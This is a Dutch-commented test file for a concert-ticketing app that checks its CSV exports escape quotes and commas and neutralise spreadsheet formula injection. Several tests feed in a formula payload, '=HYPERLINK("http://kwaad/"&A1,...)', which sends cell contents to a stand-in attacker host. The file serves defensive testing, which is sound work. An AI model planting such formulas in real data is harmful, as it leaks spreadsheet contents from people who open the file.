/**
 * De inhoud van de CSV-exports van concerten en kaartverkoop.
 *
 * Twee dingen konden hier stuk, en allebei zijn ze pas zichtbaar als je naar de
 * werkelijke tekst van het antwoord kijkt - een test op de statuscode ziet er
 * niets van.
 *
 * **Structureel.** De bezoekerslijst en de verkoopexport wikkelden elk veld in
 * aanhalingstekens maar verdubbelden de aanhalingstekens erín niet. Een koper
 * die zich `Jan "Bassie" de Vries` noemt sluit zijn eigen veld daarmee
 * halverwege af: zijn e-mailadres schuift een kolom op, en omdat de
 * kolomtelling van die rij niet meer klopt loopt de rest van het bestand mee
 * scheef. De Buma/Stemra-export quootte de samenvatting onderaan helemaal niet,
 * en die bevat `startDate` en `endDate` - ongefilterde queryreekswaarden.
 *
 * **Formule-injectie.** Een cel die met `=`, `+`, `-` of `@` begint wordt door
 * Excel, LibreOffice en Google Sheets uitgevoerd zodra iemand het bestand
 * opent. Een koper kiest zijn eigen naam, en een bezoeker kiest de datums in de
 * Buma-export. Aanhalingstekens helpen daar niet tegen: die zijn CSV-syntaxis
 * en worden bij het inlezen weggehaald voordat de cel geëvalueerd wordt.
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';
import request from 'supertest';
import express from 'express';
import { v4 as uuidv4 } from 'uuid';
import '../setup';
import db from '../../database/connection';
import concertsRoutes from '../../routes/concerts';
import ticketsRoutes from '../../routes/tickets';
import { errorHandler } from '../../middleware/errorHandler';
import { clearModuleCache } from '../../modules/service';
import { createTestEnvironment } from '../testUtils';

// De bestelroutes dragen een eigen limiet per IP; die staat los van waar dit
// bestand over gaat en zou een export op een 429 kunnen laten stuklopen.
vi.mock('express-rate-limit', () => ({
  default: () => (_req: unknown, _res: unknown, next: () => void) => next(),
}));

// De mounts volgen index.ts. Kaartverkoop hangt aan /api omdat die router paden
// onder meerdere voorvoegsels bedient.
const app = express();
app.use(express.json());
app.use('/api/concerts', concertsRoutes);
app.use('/api', ticketsRoutes);
app.use(errorHandler);

let beheerderToken: string;
let verenigingId: string;
let beheerderId: string;

beforeEach(() => {
  const omgeving = createTestEnvironment();
  beheerderToken = omgeving.adminToken;
  verenigingId = omgeving.association.id;
  beheerderId = omgeving.adminUser.id;
  zetTicketingAan(verenigingId);
});

/**
 * De module kaartverkoop staat standaard uit en de router draagt de guard zelf;
 * zonder dit antwoordt /concerts/:id/attendees met een 404.
 */
function zetTicketingAan(vanVereniging: string) {
  db.prepare(
    `INSERT INTO association_modules (id, association_id, module_key, enabled, updated_by)
     VALUES (?, ?, 'ticketing', 1, ?)
     ON CONFLICT(association_id, module_key) DO UPDATE SET enabled = 1`,
  ).run(uuidv4(), vanVereniging, beheerderId);
  clearModuleCache();
}

// ---------------------------------------------------------------------------
// Het inlezen van het antwoord
// ---------------------------------------------------------------------------

/**
 * Leest een CSV zoals een spreadsheet dat doet: een aanhalingsteken opent een
 * veld, twee achter elkaar zijn er één in de waarde.
 *
 * Bewust vergevingsgezind waar de invoer niet klopt - hij gooit niets weg en
 * werpt niets op - want juist dan moet zichtbaar worden wát de ontvanger van
 * een kapot bestand overhoudt. Dat is de bewering waar het hier om gaat.
 */
function leesCsv(tekst: string): string[][] {
  const zonderBom = tekst.replace(/^\ufeff/, '');
  const rijen: string[][] = [];
  let rij: string[] = [];
  let veld = '';
  let inAanhaling = false;

  for (let i = 0; i < zonderBom.length; i++) {
    const teken = zonderBom[i];

    if (inAanhaling) {
      if (teken === '"') {
        if (zonderBom[i + 1] === '"') {
          veld += '"';
          i++;
        } else {
          inAanhaling = false;
        }
      } else {
        veld += teken;
      }
      continue;
    }

    if (teken === '"' && veld === '') {
      inAanhaling = true;
    } else if (teken === ',') {
      rij.push(veld);
      veld = '';
    } else if (teken === '\n') {
      rij.push(veld);
      rijen.push(rij);
      rij = [];
      veld = '';
    } else if (teken !== '\r') {
      veld += teken;
    }
  }

  if (veld !== '' || rij.length > 0) {
    rij.push(veld);
    rijen.push(rij);
  }

  return rijen;
}

/** De eerste rij waarvan de eerste cel deze waarde heeft. */
function rijMet(rijen: string[][], eersteCel: string): string[] | undefined {
  return rijen.find((r) => r[0] === eersteCel);
}

// ---------------------------------------------------------------------------
// Testgegevens
// ---------------------------------------------------------------------------

function maakConcert(naam: string, datum = '2026-05-17'): string {
  const id = uuidv4();
  db.prepare(
    `INSERT INTO concerts (id, association_id, name, date, location, created_by)
     VALUES (?, ?, ?, ?, ?, ?)`,
  ).run(id, verenigingId, naam, datum, 'De Harmonie', beheerderId);
  return id;
}

function maakKaartsoort(concertId: string, naam = 'Entree'): string {
  const id = uuidv4();
  db.prepare(`INSERT INTO ticket_types (id, concert_id, name, price, quantity) VALUES (?, ?, ?, ?, ?)`).run(
    id,
    concertId,
    naam,
    12.5,
    100,
  );
  return id;
}

/** Een betaalde bestelling met een kaart erin, op naam van deze koper. */
function maakBetaaldeKaart(concertId: string, kopersnaam: string, kopersEmail = 'jan@example.com') {
  const kaartsoortId = maakKaartsoort(concertId);
  const orderId = uuidv4();
  db.prepare(
    `INSERT INTO ticket_orders (id, concert_id, total, status, payment_id, payment_method, buyer_name, buyer_email, paid_at)
     VALUES (?, ?, ?, 'paid', ?, 'ideal', ?, ?, '2026-05-01 12:00:00')`,
  ).run(orderId, concertId, 12.5, 'tr_' + orderId.slice(0, 8), kopersnaam, kopersEmail);

  db.prepare(
    `INSERT INTO ticket_order_items (id, order_id, ticket_type_id, quantity, unit_price) VALUES (?, ?, ?, 1, ?)`,
  ).run(uuidv4(), orderId, kaartsoortId, 12.5);

  db.prepare(
    `INSERT INTO tickets (id, ticket_type_id, order_id, buyer_name, buyer_email, status, qr_code, purchase_date)
     VALUES (?, ?, ?, ?, ?, 'valid', ?, '2026-05-01 12:00:00')`,
  ).run(uuidv4(), kaartsoortId, orderId, kopersnaam, kopersEmail, 'KAART-' + uuidv4().slice(0, 12));

  return orderId;
}

function zetStukInProgramma(concertId: string, stuk: { titel: string; componist?: string; arrangeur?: string }) {
  db.prepare(
    `INSERT INTO concert_program (id, concert_id, title, composer, arranger, sort_order) VALUES (?, ?, ?, ?, ?, 0)`,
  ).run(uuidv4(), concertId, stuk.titel, stuk.componist ?? null, stuk.arrangeur ?? null);
}

const alsBeheerder = (pad: string) => request(app).get(pad).set('Authorization', `Bearer ${beheerderToken}`);

// ---------------------------------------------------------------------------

describe('de bezoekerslijst van een concert als CSV', () => {
  it('houdt de kolommen heel bij een koper met een aanhalingsteken in zijn naam', async () => {
    // Deze naam sloot het veld halverwege af: het e-mailadres kwam in de kolom
    // Buyer Name terecht en alles erna schoof mee op.
    const naam = 'Jan "Bassie" de Vries';
    const concertId = maakConcert('Nieuwjaarsconcert');
    maakBetaaldeKaart(concertId, naam, 'bassie@example.com');

    const res = await alsBeheerder(`/api/concerts/${concertId}/attendees?format=csv`);

    expect(res.status).toBe(200);
    const rijen = leesCsv(res.text);
    expect(rijen[0]).toHaveLength(8);

    const rij = rijen[1];
    expect(rij).toHaveLength(8);
    expect(rij[1]).toBe(naam);
    // De echte schade: zonder verdubbelde aanhalingstekens leest de ontvanger
    // hier iets anders dan een e-mailadres.
    expect(rij[2]).toBe('bassie@example.com');
  });

  it('voert een naam die een formule is niet uit', async () => {
    // Deze haalt gegevens uit het geopende bestand naar een adres van de
    // aanvaller; de vereniging ziet bij de deur alleen een link.
    const aanval = '=HYPERLINK("http://kwaad/"&A1,"klik hier")';
    const concertId = maakConcert('Nieuwjaarsconcert');
    maakBetaaldeKaart(concertId, aanval, 'kwaad@example.com');

    const res = await alsBeheerder(`/api/concerts/${concertId}/attendees?format=csv`);

    expect(res.status).toBe(200);
    const rij = leesCsv(res.text)[1];
    expect(rij).toHaveLength(8);
    // De apostrof zegt tegen de spreadsheet "dit is tekst" en wordt in de cel
    // zelf niet getoond.
    expect(rij[1]).toBe(`'${aanval}`);
    expect(rij[1].startsWith('=')).toBe(false);
  });
});

describe('de verkoopexport van kaartverkoop', () => {
  it('houdt de kolommen heel bij een komma en een aanhalingsteken in de gegevens', async () => {
    const concertnaam = 'Voorjaarsconcert "Lente", deel 2';
    const kopersnaam = 'Jan "Bassie" de Vries';
    const concertId = maakConcert(concertnaam);
    maakBetaaldeKaart(concertId, kopersnaam, 'bassie@example.com');

    const res = await alsBeheerder('/api/tickets/sales/export');

    expect(res.status).toBe(200);
    const rijen = leesCsv(res.text);
    expect(rijen[0]).toHaveLength(13);

    const rij = rijen[1];
    expect(rij).toHaveLength(13);
    expect(rij[1]).toBe(concertnaam);
    expect(rij[3]).toBe(kopersnaam);
    // Het bedrag hoort in zijn eigen kolom te blijven staan; dit is de
    // omzetregistratie.
    expect(rij[7]).toBe('12.50');
  });

  it('voert een kopersnaam die een formule is niet uit', async () => {
    const concertId = maakConcert('Nieuwjaarsconcert');
    maakBetaaldeKaart(concertId, '=1+1', 'kwaad@example.com');

    const res = await alsBeheerder('/api/tickets/sales/export');

    expect(res.status).toBe(200);
    const rij = leesCsv(res.text)[1];
    expect(rij).toHaveLength(13);
    expect(rij[3]).toBe("'=1+1");
  });

  it('laat een gewoon bedrag optelbaar', async () => {
    // Een apostrof voor een negatief bedrag zou de kolom onoptelbaar maken;
    // getallen horen daarom ongemoeid te blijven.
    const concertId = maakConcert('Nieuwjaarsconcert');
    maakBetaaldeKaart(concertId, 'Jan Jansen');

    const res = await alsBeheerder('/api/tickets/sales/export');

    const rij = leesCsv(res.text)[1];
    expect(rij[3]).toBe('Jan Jansen');
    expect(rij[7]).toBe('12.50');
  });
});

describe('de Buma/Stemra-export', () => {
  it('houdt de kolommen heel bij een komma in een stuktitel', async () => {
    // Buma/Stemra krijgt anders de verkeerde componist bij het verkeerde stuk.
    const titel = 'Air, uit Ouverture nr. 3';
    const componist = 'Johann "JS" Bach';
    const concertId = maakConcert('Voorjaarsconcert', '2026-05-17');
    zetStukInProgramma(concertId, { titel, componist });

    const res = await alsBeheerder('/api/concerts/buma-stemra-export?startDate=2026-01-01&endDate=2026-12-31');

    expect(res.status).toBe(200);
    const rijen = leesCsv(res.text);
    expect(rijen[0]).toHaveLength(7);

    const rij = rijen[1];
    expect(rij).toHaveLength(7);
    expect(rij[3]).toBe(titel);
    expect(rij[4]).toBe(componist);
  });

  it('voert een stuktitel die een formule is niet uit', async () => {
    const aanval = '=HYPERLINK("http://kwaad/"&A1,"klik hier")';
    const concertId = maakConcert('Voorjaarsconcert', '2026-05-17');
    zetStukInProgramma(concertId, { titel: aanval, componist: 'Anoniem' });

    const res = await alsBeheerder('/api/concerts/buma-stemra-export?startDate=2026-01-01&endDate=2026-12-31');

    expect(res.status).toBe(200);
    const rij = leesCsv(res.text)[1];
    expect(rij).toHaveLength(7);
    expect(rij[3]).toBe(`'${aanval}`);
    expect(rij[3].startsWith('=')).toBe(false);
  });

  it('houdt de samenvatting onderaan heel bij een komma in de opgegeven periode', async () => {
    // startDate komt ongefilterd uit de queryreeks - er zit geen datumcontrole
    // tussen - dus dit is vrije invoer van een bezoeker.
    const res = await alsBeheerder('/api/concerts/buma-stemra-export?startDate=1 januari, 2026&endDate=2026-12-31');

    expect(res.status).toBe(200);
    const periode = rijMet(leesCsv(res.text), 'Periode');
    expect(periode).toBeDefined();
    expect(periode).toHaveLength(2);
    expect(periode![1]).toBe('1 januari, 2026 t/m 2026-12-31');
  });

  it('voert een periode die een formule is niet uit', async () => {
    const res = await alsBeheerder('/api/concerts/buma-stemra-export?startDate=%3D1%2B1&endDate=2026-12-31');

    expect(res.status).toBe(200);
    const periode = rijMet(leesCsv(res.text), 'Periode');
    expect(periode).toBeDefined();
    expect(periode![1]).toBe("'=1+1 t/m 2026-12-31");
  });
});
